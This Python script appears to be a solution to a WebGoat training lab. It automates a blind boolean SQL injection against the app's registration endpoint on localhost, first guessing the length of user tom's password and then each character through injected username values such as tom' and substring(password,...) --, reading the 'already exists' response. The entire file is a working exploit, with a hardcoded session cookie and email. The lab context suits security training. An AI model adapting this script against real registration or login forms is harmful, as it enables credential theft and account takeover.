import requests
import string

url = "http://127.0.0.1:8080/WebGoat/SqlInjectionAdvanced/register"
webgoat_session_id = "7D115CF136A7D68290EF0393CDD2359A"

email = "almuhitmuhtadi@gmail.com"
password = "deadbeef"


header = {
    "Cookie": "JSESSIONID=" + webgoat_session_id,
    # "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    # "X-Requested-With": "XMLHttpRequest",
    # "Referer": "http://localhost:8080/WebGoat/start.mvc",
    # "Origin": "http://localhost:8080",
    # "Host": "localhost:8080",
    # "Content-Length": "126",
    # "sec-ch-ua": "\"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"108\"",
    # "Accept": "*/*",
    # "Connection": "keep-alive",
    # "sec-ch-ua-mobile": "?0",
    # "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.95 Safari/537.36",
    # "sec-ch-ua-platform": "macOS",
    # "Sec-Fetch-Site": "same-origin",
    # "Sec-Fetch-Mode": "cors",
    # "Sec-Fetch-Dest": "empty",
    # "Accept-Language": "en-US,en;q=0.9",
    # "Accept-Encoding": "gzip, deflate",
}


possible_chars = string.ascii_letters + string.digits
# print(possible_chars)
found_password = ""

for length_guess in range(1, 30):
    injected_username = f"tom' and length(password)={length_guess} --"
    payload = {
        "username_reg": injected_username,
        "email_reg": email,
        "password_reg": password,
        "confirm_password_reg": password
    }
    response = requests.put(url, data=payload, headers=header)
    feedback = response.json().get("feedback")
    print("Feedback:", feedback)


    if "already exists" in feedback:
        print(f"Password length is likely: {length_guess}")
        password_length = length_guess

        for position in range(1, password_length + 1):
            for char in possible_chars:
                injected_username = f"tom' and substring(password,{position},1)='{char}' --"
                payload = {
                    "username_reg": injected_username,
                    "email_reg": email,
                    "password_reg": password,
                    "confirm_password_reg": password
                }

                response = requests.put(url, data=payload, headers=header)
                feedback = response.json().get("feedback", "")
                if "already exists" in feedback:
                    found_password += char
                    print(f"Found character {position}: {char}")
                    break

        print(f"Guessed password: {found_password}")
        break


